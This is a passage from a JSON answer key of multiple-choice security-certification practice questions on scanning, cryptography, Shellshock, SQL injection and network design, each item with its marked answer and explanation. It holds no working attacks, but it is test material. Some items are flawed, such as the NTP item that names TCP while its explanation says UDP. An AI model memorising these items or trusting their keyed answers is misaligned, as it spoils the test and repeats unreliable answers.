      "type": "MCQ",
      "question": "What Linux command will you use to resolve a domain name into an IP address?",
      "options": [
        "host -t ns resolveddomain.com",
        "host -t a resolveddomain.com",
        "host -t AXFR resolveddomain.com",
        "host -t soa resolveddomain.com"
      ],
      "correct": "B",
      "explanation": "The command 'host -t a resolveddomain.com' returns the A record (address record) which contains the IP address for the domain. Output example: resolveddomain.com has address 75.126.153.206"
    },
    {
      "q": 30,
      "type": "MCQ",
      "question": "The attacker managed to gain access to Shellshock, and now he can execute arbitrary commands and gain unauthorized access to many Internet-facing services. Which of the following operating system can't be affected by an attacker yet?",
      "options": [
        "Windows",
        "OS X",
        "Linux",
        "Unix"
      ],
      "correct": "A",
      "explanation": "Shellshock is a family of security bugs in the Unix Bash shell. It affects Bash on Unix-based systems including Linux, OS X, and Unix. Windows does not use Bash as its command shell and is therefore not affected by Shellshock."
    },
    {
      "q": 31,
      "type": "MCQ",
      "question": "A digital signature is the digital equivalent of a handwritten signature or stamped seal. It is intended to solve the problem of tampering and impersonation in digital communications. Which of the following option does a digital signature NOT provide?",
      "options": [
        "Integrity",
        "Non-repudiation",
        "Confidentiality",
        "Authentication"
      ],
      "correct": "C",
      "explanation": "Digital signatures provide Authentication (verifying the identity of the sender), Integrity (ensuring the message has not been altered), and Non-repudiation (the signer cannot deny signing). However, digital signatures do NOT provide Confidentiality - they do not encrypt the content of the message."
    },
    {
      "q": 32,
      "type": "MCQ",
      "question": "Lisandro is engaged in sending spam. To avoid blocking, he connects to incorrectly configured SMTP servers that allow e-mail relay without authentication (which allows Lisandro to fake information about the sender's identity). What is the name of such an SMTP server?",
      "options": [
        "Weak SMTP.",
        "Message transfer agent.",
        "Open mail relay.",
        "Public SMTP server."
      ],
      "correct": "C",
      "explanation": "An open mail relay is an SMTP server configured to allow anyone on the Internet to send email through it, not just mail destined to or originating from known users. They have become unpopular due to exploitation by spammers."
    },
    {
      "q": 33,
      "type": "MCQ",
      "question": "Identify which of the following will provide you with the most information about the system's security posture?",
      "options": [
        "Phishing, spamming, sending trojans",
        "Wardriving, warchalking, social engineering",
        "Port scanning, banner grabbing, service identification",
        "Social engineering, company site browsing, tailgating"
      ],
      "correct": "C",
      "explanation": "Port scanning (determining which ports are open), banner grabbing (gaining information about services from banners), and service identification (enumerating services and underlying OS) provide the most comprehensive information about a system's security posture."
    },
    {
      "q": 34,
      "type": "MCQ",
      "question": "Which mode of a NIC (interface) allows you to intercept and read each network packet that arrives in its entirety?",
      "options": [
        "Simplex Mode",
        "Port forwarding",
        "Multicast",
        "Promiscuous mode"
      ],
      "correct": "D",
      "explanation": "Promiscuous mode is a mode for a network interface controller that causes the controller to pass all traffic it receives to the CPU rather than passing only the frames specifically programmed to receive. This mode is normally used for packet sniffing."
    },
    {
      "q": 35,
      "type": "MCQ",
      "question": "When getting information about the web server, you should be familiar with methods GET, POST, HEAD, PUT, DELETE, TRACE. There are two critical methods in this list: PUT (upload a file to the server) and DELETE (delete a file from the server). When using nmap, you can detect all these methods. Which of the following nmap scripts will help you detect these methods?",
      "options": [
        "http enum",
        "http-headers",
        "http ETag",
        "http-methods"
      ],
      "correct": "D",
      "explanation": "The http-methods NSE script enumerates the HTTP methods supported by the web server. This is useful for discovering potentially dangerous methods like PUT and DELETE that could be exploited."
    },
    {
      "q": 36,
      "type": "MCQ",
      "question": "Identify an adaptive SQL Injection testing technique by the description: A testing technique is used to discover coding errors by inputting massive amounts of random data and observing the changes in the output.",
      "options": [
        "Fuzz Testing.",
        "Dynamic Testing.",
        "Functional Testing.",
        "Static application security testing."
      ],
      "correct": "A",
      "explanation": "Fuzz testing is an automated or semi-automated testing technique that discovers defects by providing invalid input data or massive random data (fuzz) to test the system and attempt to crash it or find vulnerabilities like SQL injection."
    },
    {
      "q": 37,
      "type": "MCQ",
      "question": "Which of the following is the type of message that sends the client to the server to begin a 3-way handshake while establishing a TCP connection?",
      "options": [
        "SYN",
        "SYN-ACK",
        "ACK",
        "RST"
      ],
      "correct": "A",
      "explanation": "To establish a TCP connection, the three-way handshake occurs: 1) SYN - The client sends a SYN to the server to initiate the connection, 2) SYN-ACK - The server replies with SYN-ACK, 3) ACK - The client sends ACK back to complete the handshake."
    },
    {
      "q": 38,
      "type": "MCQ",
      "question": "Confidential information is stored and processed on your company's servers, however, auditing has never been enabled. What of the following should be done before enabling the audit feature?",
      "options": [
        "Perform a cost/benefit analysis of the audit feature.",
        "Allocate funds for staffing of audit log review.",
        "Determine the impact of enabling the audit feature.",
        "Perform a vulnerability scan of the system."
      ],
      "correct": "C",
      "explanation": "Before introducing any new function or option, it's necessary to first assess the risks and their impact on the end system. This is standard practice according to security specifications and recommendations."
    },
    {
      "q": 39,
      "type": "MCQ",
      "question": "Which of the following best describes of counter-based authentication system?",
      "options": [
        "An authentication system that creates one-time passwords that are encrypted with secret keys.",
        "An authentication system that bases authentication decisions on behavioural attributes.",
        "An authentication system that bases authentication decisions on physical attributes.",
        "An authentication system that uses passphrases that are converted into virtual passwords."
      ],
      "correct": "A",
      "explanation": "In counter-based tokens, both the token and authenticating server maintain a counter whose value (besides a shared secret key) is used to generate the one-time password encrypted with secret keys."
    },
    {
      "q": 40,
      "type": "MCQ",
      "question": "Which of the following method of password cracking takes the most time?",
      "options": [
        "Dictionary attack",
        "Brute force",
        "Rainbow tables",
        "Shoulder surfing"
      ],
      "correct": "B",
      "explanation": "A brute-force attack systematically checks all possible passwords and passphrases until the correct one is found. As password length increases, the amount of time and computational power required increases exponentially, making it the most time-consuming method."
    },
    {
      "q": 41,
      "type": "MCQ",
      "question": "Leonardo, an employee of a cybersecurity firm, conducts an audit for a third-party company. First of all, he plans to run a scanning that looks for common misconfigurations and outdated software versions. Which of the following tools is most likely to be used by Leonardo?",
      "options": [
        "Nmap",
        "Nikto",
        "Armitage",
        "Metasploit"
      ],
      "correct": "B",
      "explanation": "Nikto is a free software command-line vulnerability scanner that scans webservers for dangerous files/CGIs, outdated server software, misconfigurations and other problems. It's specifically designed to find common misconfigurations and outdated software."
    },
    {
      "q": 42,
      "type": "MCQ",
      "question": "The absolute majority of routers and switches use packet filtering firewalls. That kind of firewalls makes decisions about allowing traffic to pass into the network based on the information contained in the packet header. At what level of the OSI model do these firewalls work?",
      "options": [
        "Physical layer",
        "Session layer",
        "Application layer",
        "Network layer"
      ],
      "correct": "D",
      "explanation": "Packet-filtering firewalls operate at the network layer (Layer 3) of the OSI model. They make processing decisions based on network addresses, ports, or protocols by examining packet headers."
    },
    {
      "q": 43,
      "type": "MCQ",
      "question": "Lisandro is a novice fraudster, he uses special software purchased in the depths of the network for sending his malware. This program allows it to deceive pattern-based detection mechanisms and even some behavior-based ones, disguising malwares as harmless programs. What does Lisandro use?",
      "options": [
        "Crypter",
        "Ransomware",
        "Payload",
        "Dropper"
      ],
      "correct": "A",
      "explanation": "A crypter is software that can encrypt, obfuscate, and manipulate malware to make it harder to detect by security programs. It presents malware as a harmless program until installed. Crypters use stubs to encrypt and decrypt malicious code."
    },
    {
      "q": 44,
      "type": "MCQ",
      "question": "Enumeration is a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system. What type of enumeration is used to get shared resources on individual hosts on the network and a list of computers belonging to the domain?",
      "options": [
        "Netbios enumeration",
        "SNMP enumeration",
        "NTP enumeration",
        "SMTP enumeration"
      ],
      "correct": "A",
      "explanation": "NetBIOS enumeration is used to obtain: list of computers that belong to a domain, list of shares on individual hosts on the network, and policies and passwords. NetBIOS allows computer communication over a LAN."
    },
    {
      "q": 45,
      "type": "MCQ",
      "question": "Having a sufficient database of passwords, you can use statistical analysis of the list of words, you can create a very effective way to crack passwords for such tools as, for example, John The Ripper. Which of the attacks uses such an analysis to calculate the probability of placing characters in a quasi-brute attack?",
      "options": [
        "Prince",
        "Markov Chain",
        "Fingerprint",
        "Toggle-Case"
      ],
      "correct": "B",
      "explanation": "Markov Chain technique requires assembling a password database, splitting passwords into 2-grams and 3-grams, developing a new alphabet of elements, and using statistical analysis to calculate the probability of character placement for password cracking."
    },
    {
      "q": 46,
      "type": "MCQ",
      "question": "Alex, a network administrator, received a warning from IDS about a possibly malicious sequence of packets sent to a Web server in the network's external DMZ. The packet traffic was captured by the IDS and saved to a PCAP file. Now Alex needs to determine if these packets are genuinely malicious or simply a false positive. Which of the following type of network tools will he use?",
      "options": [
        "Host-based intrusion prevention system (HIPS).",
        "Protocol analyzer.",
        "Vulnerability scanner.",
        "Intrusion Prevention System (IPS)."
      ],
      "correct": "B",
      "explanation": "A protocol analyzer (network protocol analyzer) is used to monitor data traffic and analyze captured signals. It can analyze information from PCAP files. Wireshark is the most widely-used network protocol analyzer."
    },
    {
      "q": 47,
      "type": "MCQ",
      "question": "Identify the structure designed to verify and authenticate the identity of individuals within the enterprise taking part in a data exchange?",
      "options": [
        "PKI",
        "single sign-on",
        "biometrics",
        "SOA"
      ],
      "correct": "A",
      "explanation": "PKI (Public Key Infrastructure) is an arrangement that binds public keys with respective identities of entities. The binding is established through registration and issuance of certificates at a certificate authority (CA)."
    },
    {
      "q": 48,
      "type": "MCQ",
      "question": "Organizations need to deploy a web-based software package that requires three separate servers and internet access. What is the recommended architecture in terms of server placement?",
      "options": [
        "A web server and the database server facing the Internet, an application server on the internal network.",
        "All three servers need to be placed internally.",
        "All three servers need to face the Internet so that they can communicate between themselves.",
        "A web server facing the Internet, an application server on the internal network, a database server on the internal network."
      ],
      "correct": "D",
      "explanation": "In three-tier architecture: web server (presentation tier) faces the Internet, application server (logic tier) on internal network processes data, and database server (data tier) on internal network stores data. This separates public-facing components from sensitive data storage."
    },
    {
      "q": 49,
      "type": "MCQ",
      "question": "Which of the following is true about the AES and RSA encryption algorithms?",
      "options": [
        "AES is asymmetric, which is used to create a public/private key pair; RSA is symmetric, which is used to encrypt data.",
        "Both are asymmetric algorithms, but RSA uses 1024-bit keys.",
        "Both are symmetric algorithms, but AES uses 256-bit keys.",
        "RSA is asymmetric, which is used to create a public/private key pair; AES is symmetric, which is used to encrypt data."
      ],
      "correct": "D",
      "explanation": "RSA is an asymmetric algorithm using public/private key pairs for encryption. AES (Advanced Encryption Standard) is a symmetric block cipher chosen by the U.S. government to protect classified information."
    },
    {
      "q": 50,
      "type": "MCQ",
      "question": "Jack needs to analyze the files produced by several packet-capture programs such as Wireshark, tcpdump, EtherPeek and WinDump. Which of the following tools will Jack use?",
      "options": [
        "tcptraceroute",
        "Nessus",
        "tcptrace",
        "OpenVAS"
      ],
      "correct": "C",
      "explanation": "tcptrace is a TCP connection analysis tool that can analyze dump files from various packet-capture programs including tcpdump (pcap library), Sun's snoop, Macintosh Etherpeek, HP/NetMetrix, NS simulator, NetScout, and NLANR Tsh formats."
    },
    {
      "q": 51,
      "type": "MCQ",
      "question": "Which of the following nmap options can be used for very fast scanning?",
      "options": [
        "-T0",
        "-O",
        "-T4",
        "-T5"
      ],
      "correct": "D",
      "explanation": "The -T5 option performs a very fast (insane) scan. Nmap timing templates range from -T0 (paranoid, slowest) to -T5 (insane, fastest). -T5 is used when you don't worry about being detected and want maximum speed."
    },
    {
      "q": 52,
      "type": "MCQ",
      "question": "Identify a tool that can be used for passive OS fingerprinting?",
      "options": [
        "ping",
        "tcpdump",
        "nmap",
        "tracert"
      ],
      "correct": "B",
      "explanation": "tcpdump can be used for passive OS fingerprinting by capturing and analyzing packets without sending any traffic. It places the network card in promiscuous mode to capture all packets, allowing analysis of traffic patterns to identify operating systems."
    },
    {
      "q": 53,
      "type": "MCQ",
      "question": "ISAPI filters is a powerful tool that is used to extend the functionality of IIS. However, improper use can cause huge harm. Why do EC-Council experts recommend that security analysts monitor the disabling of unused ISAPI filters?",
      "options": [
        "To defend against wireless attacks",
        "To prevent memory leaks",
        "To defend against webserver attacks",
        "To prevent leaks of confidential data"
      ],
      "correct": "C",
      "explanation": "ISAPI filters can be used to open technological gateways and allow hackers to access items marked as 'access denied'. Disabling unnecessary ISAPI filters helps defend against webserver attacks by preventing unauthorized access to confidential web spaces."
    },
    {
      "q": 54,
      "type": "MCQ",
      "question": "Identify a low-tech way of gaining unauthorized access to information?",
      "options": [
        "Scanning",
        "Eavesdropping",
        "Sniffing",
        "Social engineering"
      ],
      "correct": "D",
      "explanation": "Social engineering is the psychological manipulation of people into performing actions or divulging confidential information. It's a low-tech attack method that exploits human decision-making biases rather than technical vulnerabilities. Examples include phishing, pretexting, and impersonation."
    },
    {
      "q": 55,
      "type": "MCQ",
      "question": "Which of the following services run on TCP port 123 by default?",
      "options": [
        "Telnet",
        "DNS",
        "NTP",
        "POP3"
      ],
      "correct": "C",
      "explanation": "The Network Time Protocol (NTP) is a networking protocol for clock synchronization between computer systems. NTP sends and receives timestamps using UDP on port number 123 (not TCP, but the question asks about the service that uses port 123)."
    },
    {
      "q": 56,
      "type": "MCQ",
      "question": "The SOC analyst of the company wants to track the transfer of files over the unencrypted FTP protocol, which filter for the Wireshark sniffer should he use?",
      "options": [
        "tcp.port == 443",
        "tcp.port == 80",
        "tcp.port = 23",
        "tcp.port ==21"
      ],
      "correct": "D",
      "explanation": "FTP (File Transfer Protocol) uses TCP port 21 for control connections. Port 21 is the standard port for FTP communication. Port 23 is Telnet, port 80 is HTTP, and port 443 is HTTPS."
    },
    {
      "q": 57,
      "type": "MCQ",
      "question": "Your company regularly conducts backups of critical servers but cannot afford them to be sent off-site vendors for long-term storage and archiving. The company found a temporary solution in the form of storing backups in the company's safe. During the next audit, there was a risk associated with the fact that backup storages are not stored off-site. The company manager has a plan to take the backup storages home with him and wants to know what two things he can do to secure the backup tapes while in transit?",
      "options": [
        "Degauss the backup tapes and transport them in a lockbox.",
        "Encrypt the backup tapes and transport them in a lockbox.",
        "Encrypt the backup tapes and use a courier to transport them.",
        "Hash the backup tapes and transport them in a lockbox."
      ],
      "correct": "B",
      "explanation": "Encrypting the backup tapes protects the data if intercepted, and transporting them in a lockbox adds physical security. Degaussing would erase the data, and hashing is one-way and wouldn't allow data recovery."
    },
    {
      "q": 58,
      "type": "MCQ",
      "question": "Gabriella uses Google search operators, which allow you to optimize and expand the capabilities of regular search. What will be the result of this request? site:eccouncil.org discount -ilearn",
      "options": [
        "The results that match the entire query.",
        "Results about all discounts from the site eccouncil.org except for the ilearn format.",
        "Results about all discounts from the site ec-council.org for the ilearn training format.",
        "Results from the ec-council website except for discounts and the ilearn format."
      ],
      "correct": "B",
      "explanation": "The 'site:' operator limits results to eccouncil.org, 'discount' searches for that term, and '-ilearn' excludes results containing 'ilearn'. So it returns discount-related results from eccouncil.org excluding ilearn format."
    },
    {
      "q": 59,
      "type": "MCQ",
      "question": "There are different ways of pentest of a system, network, or application in information security based on how much information you have about the target. There's black box testing, white box testing, and gray box testing. Which of the statements is true about grey-box testing?",
      "options": [
        "The tester has full access to the internal structure.",
        "The tester is unaware of the internal structure.",
        "The tester does not have access at all.",
        "The tester only partially knows the internal structure."
      ],
      "correct": "D",
      "explanation": "Gray-box testing is a combination of white-box and black-box testing where the tester has some limited knowledge of the internal workings. The tester has partial knowledge of the internal structure, not full access (white box) or no access (black box)."
    },
    {
      "q": 60,
      "type": "MCQ",
      "question": "When choosing a biometric system for your company, you should take into account the factors of system performance and whether they are suitable for you or not. What determines such a factor as the throughput rate?",
      "options": [
        "The probability that the system fails to detect a biometric input when presented correctly.",
        "The maximum number of sets of data that can be stored in the system.",
        "The data collection speeds, data processing speed, or enrolment time.",
        "The probability that the system incorrectly matches the input pattern to a non-matching template in the database."
      ],
      "correct": "C",
      "explanation": "Throughput rate refers to data collection speeds (speed at which individuals can be processed), data processing speed, or enrollment time. It's about how quickly the system can process people through the biometric check."
    },
    {
      "q": 61,
      "type": "MCQ",
      "question": "The attacker tries to find the servers of the attacked company. He uses the following command: nmap 192.168.1.64/28. The scan was successful, but he didn't get any results. Identify why the attacker could not find the server based on the following information: The attacked company used network address 192.168.1.64 with mask 255.255.255.192. In the network, the servers are in the addresses192.168.1.122, 192.168.1.123 and 192.168.1.124.",
      "options": [
        "He needs to add the command 'ip address' just before the IP address.",
        "He needs to change the address to 192.168.1.0 with the same mask.",
        "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range.",
        "The network must be down and the nmap command and IP address are ok."
      ],
      "correct": "C",
      "explanation": "A /28 subnet mask provides 16 IP addresses (192.168.1.64 to 192.168.1.79). The servers at 192.168.1.122-124 are outside this range, which is why the scan didn't find them."
    },
    {
      "q": 62,
      "type": "MCQ",
      "question": "Victims of DoS attacks often are web servers of high-profile organizations such as banking, commerce, media companies, or government and trade organizations. Which of the following symptom could indicate a DoS or DDoS attack?",
      "options": [
        "An inability to access any website",
        "Damage and corrupt files.",
        "Unknown programs running on your system.",
        "Misbehaviour of computer programs and application."
      ],
      "correct": "A",
      "explanation": "DDoS symptoms include slow access to files, long-term inability to access a particular website, Internet disconnection, problems accessing all websites, and excessive spam emails. An inability to access any website is a key symptom."
    },
    {
      "q": 63,
      "type": "MCQ",
      "question": "Rajesh, a black-hat hacker, could not find vulnerabilities in the target company's network since their infrastructure is very well protected. IDS, firewall with strict rules, etc. He is trying to find such an attack method independent of the reliability of the infrastructure of this company. Which attack is an option suitable for Rajesh?",
      "options": [
        "Buffer Overflow",
        "Denial-of-Service",
        "Social Engineering",
        "Confidence trick"
      ],
      "correct": "C",
      "explanation": "Social engineering is an attack method that is independent of the technical infrastructure's security. It exploits human psychology to trick users into making security mistakes or giving away sensitive information, bypassing technical controls entirely."
    },
    {
      "q": 64,
      "type": "MCQ",
      "question": "Identify the attack where the hacker uses the ciphertexts corresponding to a set of plaintexts of his own choosing?",
      "options": [
        "Kasiski examination",
        "Chosen-plaintext",
        "Differential cryptanalysis",
        "Known-plaintext attack"
      ],
      "correct": "B",
      "explanation": "A chosen-plaintext attack (CPA) is an attack model where the attacker can obtain the ciphertexts for arbitrary plaintexts of their choosing. The goal is to gain information that reduces the security of the encryption scheme."
    },
    {
      "q": 65,
      "type": "MCQ",
      "question": "Due to the network slowdown, the IT department decided to monitor the Internet traffic of all employees to track a possible cause, but they can't do it immediately. Which of the following is troublesome to take this kind of measure from a legal point of view?",
      "options": [
        "The absence of an official responsible for traffic on the network.",
        "Not informing the employees that they are going to be monitored could be an invasion of privacy.",
        "Lack of comfortable working conditions.",
        "All of the employees would stop normal work activities."
      ],
      "correct": "B",
      "explanation": "From a legal perspective, not informing employees they will be monitored could constitute invasion of privacy. Disclosing surveillance is the smartest legal tactic as it removes employees' reasonable expectation of privacy, which often forms the basis for invasion-of-privacy lawsuits."
    },
    {
      "q": 66,
      "type": "MCQ",
      "question": "What is the name of the risk assessment method that allows you to study how various types of negative events (violations, failures or destructions) can affect the main activities of the company and key business processes?",
      "options": [
        "Disaster Recovery Planning (DRP)",
        "Business Impact Analysis (BIA)",
        "Emergency Plan Response (EPR)",
        "Risk Mitigation"
      ],
      "correct": "B",
      "explanation": "Business impact analysis (BIA) is a systematic process to determine and evaluate the potential effects of an interruption to critical business operations due to disaster, accident, or emergency. It's an essential component of business continuance planning."
    },
    {
      "q": 67,
      "type": "MCQ",
      "question": "Which of the following type of hackers refers to an individual who works both offensively and defensively?",
      "options": [
        "White Hat",
        "Gray Hat",
        "Suicide Hacker",
        "Black Hat"
      ],
      "correct": "B",
      "explanation": "A grey hat (gray hat) is a computer hacker or security expert who may sometimes violate laws or ethical standards but does not have the malicious intent of a black hat hacker. They work both offensively (finding vulnerabilities) and defensively."
    },
    {
      "q": 68,
      "type": "MCQ",
      "question": "While performing online banking using a browser, your friend receives a message that contains a link to a website. He decides to click on this link, and another browser session starts and displays a funny video. A few hours later, he receives a letter from the bank stating that his online bank was visited from another country and tried to transfer money. The bank also asks him to contact them and confirm the transfer if he really made it. What vulnerability did the attacker use when attacking your friend?",
      "options": [
        "Cross-Site Request Forgery",
        "Webform input validation",
        "Cross-Site Scripting",
        "Clickjacking"
      ],
      "correct": "A",
      "explanation": "Cross-site request forgery (CSRF) is a malicious exploit where unauthorized commands are submitted from a user that the web application trusts. The attacker tricked the victim into submitting a web request they did not intend, causing actions to be performed on the banking website."
    },
    {
      "q": 69,
      "type": "MCQ",
      "question": "Which of the following is the most effective way against encryption ransomware?",
      "options": [
        "Use multiple antivirus software.",
        "Pay a ransom.",
        "Analyze the ransomware to get the decryption key of encrypted data.",
        "Use the 3-2-1 backup rule."
      ],
      "correct": "D",
      "explanation": "The most effective way to handle ransomware attacks is to use the 3-2-1 backup rule: keep at least three separate versions of data on two different storage types with at least one offsite. This allows recovery without paying ransom."
    },
    {
      "q": 70,
      "type": "MCQ",
      "question": "Which of the following modes of IPSec should you use to assure integrity and confidentiality of data within the same LAN?",
      "options": [
        "ESP tunnel mode.",
        "AH tunnel mode.",
        "ESP transport mode.",
        "AH transport mode."
      ],
      "correct": "C",
      "explanation": "ESP transport mode should be used to ensure the integrity and confidentiality of data exchanged within the same LAN. AH only provides integrity, not confidentiality. Tunnel mode is used between networks, not within a network."
    },
    {
      "q": 71,
      "type": "MCQ",
      "question": "To protect the enterprise infrastructure from the constant attacks of the evil hacker Ivan, Viktor divided the network into two parts using the network segmentation approach. In the first one (local, without direct Internet access), he isolated business-critical resources. In the second (external, with Internet access), he placed public web servers to provide services to clients. Subnets communicate with each other through a gateway protected by a firewall. What is the name of the external subnet?",
      "options": [
        "Demilitarized Zone",
        "WAF",
        "Bastion host",
        "Network access control"
      ],
      "correct": "A",
      "explanation": "DMZ (demilitarized zone) is a physical or logical subnetwork that contains and exposes an organization's external-facing services to an untrusted network such as the Internet. It adds an additional layer of security by isolating public-facing services from the internal network."
    },
    {
      "q": 72,
      "type": "MCQ",
      "question": "After scanning the ports on the target machine, you see a list of open ports, which seems unusual to you: Starting NMAP 5.21 at 2019-06-18 12:32; Host is up (1.00s latency); PORT STATE SERVICE includes 21/tcp open ftp, 23/tcp open telnet, 80/tcp open http, 139/tcp open netbios-ssn, 515/tcp open, 631/tcp open ipp, 9100/tcp open. Based on the NMAP output, identify what is most likely this host?",
      "options": [
        "The host is likely a router.",
        "The host is likely a printer.",
        "The host is likely a Windows machine.",
        "The host is likely a Linux machine."
      ],
      "correct": "B",
      "explanation": "Port 515 (Line Printer Daemon protocol) and port 9100 (raw printing) are printer-specific ports. Combined with IPP (631) and other services, this indicates the host is most likely a network printer."
    },
    {
      "q": 73,
      "type": "MCQ",
      "question": "John needs to send a super-secret message, and for this, he wants to use the technique of hiding a secret message within an ordinary message. The technique provides 'security through obscurity.' Which of the following techniques will John use?",
      "options": [
        "Digital watermarking",
        "Encryption",
        "Steganography",
        "Deniable encryption"
      ],
      "correct": "C",
      "explanation": "Steganography is the art of hiding a secret message in an ordinary object. It ensures that the object in which the message is hidden will not attract attention as there is no sign of anything hidden. It provides security through obscurity."
    },
    {
      "q": 74,
      "type": "MCQ",
      "question": "Identify the algorithm according to the following description: That wireless security algorithm was rendered useless by capturing packets and discovering the passkey in seconds. This vulnerability was strongly affected to TJ Maxx company. This vulnerability led to a network invasion of the company and data theft through a technique known as wardriving.",
      "options": [
        "Wi-Fi Protected Access (WPA)",
        "Wi-Fi Protected Access 2 (WPA2)",
        "Temporal Key Integrity Protocol (TKIP)",
        "Wired Equivalent Privacy (WEP)"
      ],
      "correct": "D",
      "explanation": "WEP (Wired Equivalent Privacy) was rendered useless by packet capture techniques that could discover the passkey in seconds. The TJ Maxx breach in 2007 was caused by hackers exploiting WEP vulnerability via wardriving. The Payment Card Industry prohibited WEP use after 2010."
    },
    {
      "q": 75,
      "type": "MCQ",
      "question": "What of the following is the most common method of using 'ShellShock' or 'Bash Bug'?",
      "options": [
        "Using SSH.",
        "Through Web servers utilizing CGI to send a malformed environment variable.",
        "Manipulate format strings in text fields.",
        "Using SYN Flood."
      ],
      "correct": "B",
      "explanation": "The shellshock vulnerability arises from the underlying operating system using an older version of Bash in combination with a web server utilizing CGI scripting. An attacker can use CGI to send a malformed environment variable to exploit the vulnerability."
    },
    {
      "q": 76,
      "type": "MCQ",
      "question": "Which of the following is most useful for quickly checking for SQL injection vulnerability by sending a special character to web applications?",
      "options": [
        "Semicolon",
        "Single quotation",
        "Double quotation",
        "Backslash"
      ],
      "correct": "B",
      "explanation": "A single quote (') is most useful for quickly testing SQL injection. When injected into a query, if the application is vulnerable, it will break the query and throw an error, indicating that user input is not properly sanitized."
    },
    {
      "q": 77,
      "type": "MCQ",
      "question": "John received this text message: 'Hello, this is Jack Smith from the Gmail customer service. Kindly contact me about problems with your account: jacksmith@gmail.com'. Which statement below is true?",
      "options": [
        "John should write to jacksmith@gmail.com to verify the identity of Jack.",
        "This is a scam as everybody can get a @gmail.com address, not the Gmail customer service employees.",
        "This is a scam because John does not know Jack.",
        "This is probably a legitimate message as it comes from a respectable organization."
      ],
      "correct": "B",
      "explanation": "This is a scam. Anyone can register a Gmail email address - it's not restricted to Gmail customer service employees. Scammers commonly use free email services to mislead victims by impersonating legitimate organizations."
    },
    {
      "q": 78,
      "type": "MCQ",
      "question": "Which of the following stops vehicles from crashing through the doors of a building?",
      "options": [
        "Bollards",
        "Turnstile",
        "Mantrap",
        "Traffic barrier"
      ],
      "correct": "A",
      "explanation": "A bollard is a sturdy, short, vertical post originally used on ships for mooring but now also used to control road traffic and prevent ram-raiding and vehicle-ramming attacks. Bollards can prevent vehicles from crashing through building entrances."
    },
    {
      "q": 79,
      "type": "MCQ",
      "question": "Identify a security policy that defines using of a VPN for gaining access to an internal corporate network?",
      "options": [
        "Information protection policy",
        "Access control policy",
        "Network security policy",
        "Remote access policy"
      ],
      "correct": "D",
      "explanation": "Remote access policy is a document that outlines the principles, procedures and guidelines for remotely connecting to the internal network. It's essential for geographically dispersed networks and defines acceptable methods like VPN for remote access."
    },
    {
      "q": 80,
      "type": "MCQ",
      "question": "Identify the type of DNS configuration in which first DNS server on the internal network and second DNS in DMZ?",
      "options": [
        "Split DNS",
        "EDNS",
        "DynDNS",
        "DNSSEC"
      ],
      "correct": "A",
      "explanation": "Split-horizon DNS (split DNS) provides different sets of DNS information usually selected by the source address of the DNS request. It allows separation of DNS information for network-internal access and external/public access for security and privacy."
    },
    {
      "q": 81,
      "type": "MCQ",
      "question": "Which of the following is an entity in a PKI that will vouch for the identity of an individual or company?",
      "options": [
        "KDC",
        "CA",
        "CR",
        "VA"
      ],
      "correct": "B",
      "explanation": "Certificate authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject. A CA acts as a trusted third party vouching for identity."
    },
    {
      "q": 82,
      "type": "MCQ",
      "question": "Alex, the system administrator, should check the firewall configuration. He knows that all traffic from workstations must pass through the firewall to access the bank's website. Alex must ensure that workstations in network 10.10.10.0/24 can only reach the bank website 10.20.20.1 using HTTPS. Which of the following firewall rules best meets this requirement?",
      "options": [
        "If (source matches 10.10.10.0/24 and destination matches 10.20.20.1 and port matches 80 or 443) then permit",
        "If (source matches 10.20.20.1 and destination matches 10.10.10.0/24 and port matches 443) then permit",
        "If (source matches 10.10.10.0 and destination matches 10.20.20.1 and port matches 443) then permit",
        "If (source matches 10.10.10.0/24 and destination matches 10.20.20.1 and port matches 443) then permit"
      ],
      "correct": "D",
      "explanation": "The rule must match source 10.10.10.0/24 (workstation network), destination 10.20.20.1 (bank website), and port 443 (HTTPS). The /24 subnet notation is required to include all workstations in the range."
    },
    {
      "q": 83,
      "type": "MCQ",
      "question": "The CIA Triad is a security model that highlights the main goals of data security and serves as a guide for organizations to protect their confidential data from unauthorized access and data theft. What are the three concepts of the CIA triad?",
      "options": [
        "Transference, transformation and transcendence",
        "Comparison, reflection and abstraction",
        "Efficiency, equity and liberty",
        "Confidentiality, integrity, and availability"
      ],
      "correct": "D",
      "explanation": "The CIA Triad consists of Confidentiality (protecting data from unauthorized access), Integrity (protecting data from unauthorized changes), and Availability (ensuring authorized users have access to systems and resources when needed)."
    },
    {
      "q": 84,
      "type": "MCQ",
      "question": "Implementing the security testing process early in the SDLC is the key to finding out and fixing the security bugs early in the SDLC lifecycle. The security testing process can be performed in two ways, Automated or Manual web application security testing. Which of the proposed statements is true?",
      "options": [
        "Automatic testing requires a lot of money and is still very imperfect, so it cannot be used for security",
        "Automatic and manual testing should be used together to better cover potential problems",
        "Manual testing is obsolete and should be completely replaced by automatic testing.",
        "Neural networks and artificial intelligence are already used in new tools and do not require additional actions"
      ],
      "correct": "B",
      "explanation": "Both automated and manual testing approaches should be used together. Automated tools provide speed and coverage but may miss logical vulnerabilities. Manual testing provides effectiveness in finding complex issues. Together they achieve the greatest coverage."
    },
    {
      "q": 85,
      "type": "MCQ",
      "question": "What type of cryptography is used in IKE, SSL, and PGP?",
      "options": [
        "Public Key",
        "Hash",
        "Digest",
        "Secret Key"
      ],
      "correct": "A",
      "explanation": "IKE (Internet Key Exchange), SSL (Secure Sockets Layer), and PGP (Pretty Good Privacy) all use public-key cryptography (asymmetric cryptography) which uses public/private key pairs."
    },
    {
      "q": 86,
      "type": "MCQ",
      "question": "The ping utility is used to check the integrity and quality of connections in networks. In the process, it sends an ICMP Echo-Request and captures the incoming ICMP Echo-Reply, but quite often remote nodes block or ignore ICMP. Which of the options will solve this problem?",
      "options": [
        "Use arping",
        "Use traceroute",
        "Use hping",
        "Use broadcast ping"
      ],
      "correct": "C",
      "explanation": "hping is a packet generator and analyzer for TCP/IP that can send various types of packets including TCP, UDP, ICMP and RAW-IP. It can be used when ICMP is blocked, as it supports multiple protocols and scanning techniques."
    },
    {
      "q": 87,
      "type": "MCQ",
      "question": "An attacker tries to infect as many devices connected to the Internet with malware as possible to get the opportunity to use their computing power and functionality for automated attacks hidden from the owners of these devices. Which of the proposed approaches fits description of the attacker's actions?",
      "options": [
        "Mass distribution of Ransomware",
        "APT attack",
        "Creating a botnet",
        "Using Banking Trojans"
      ],
      "correct": "C",
